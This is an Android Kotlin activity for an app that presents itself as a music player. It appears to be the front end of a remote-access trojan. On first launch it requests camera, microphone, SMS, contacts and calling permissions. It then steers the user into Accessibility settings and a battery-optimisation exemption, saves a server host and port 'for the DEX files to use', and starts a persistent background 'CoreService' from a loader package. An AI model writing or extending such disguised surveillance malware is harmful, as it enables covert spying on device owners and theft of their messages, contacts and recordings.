package com.nexrtz.andload

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.nexrtz.andload.ui.MusicScreen
import com.nexrtz.andload.ui.MusicViewModel
import com.nexrtz.andload.ui.theme.CyberTheme
import com.nexrtz.loader.Config
import com.nexrtz.loader.CoreService

class MainActivity : ComponentActivity() {

    private val viewModel: MusicViewModel by viewModels()

    // The launcher that was missing
    private val allPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        // After permissions are handled, open Accessibility settings
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Save IP for the DEX files to use
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("server_ip", Config.SERVER_HOST).apply()
        prefs.edit().putInt("server_port", Config.SERVER_PORT).apply()

        if (!prefs.getBoolean("setup_done", false)) {
            val perms = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.CALL_PHONE
            )
            if (Build.VERSION.SDK_INT >= 33) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            allPermissionsLauncher.launch(perms.toTypedArray())
        } else {
            startBackgroundCore()
        }

        setContent {
            CyberTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    MusicScreen(
                        viewModel = viewModel,
                        onRecordRequested = {} // Keep your existing logic here
                    )
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)

        // Handle Battery Optimization prompt after returning from Accessibility
        if (!prefs.getBoolean("setup_done", false)) {
            if (prefs.getBoolean("asked_battery", false)) {
                // If we come back a second time, onboarding is done.
                prefs.edit().putBoolean("setup_done", true).apply()
                startBackgroundCore()
            } else {
                // Ask for Battery Optimization
                prefs.edit().putBoolean("asked_battery", true).apply()
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        }
    }

    private fun startBackgroundCore() {
        val serviceIntent = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
}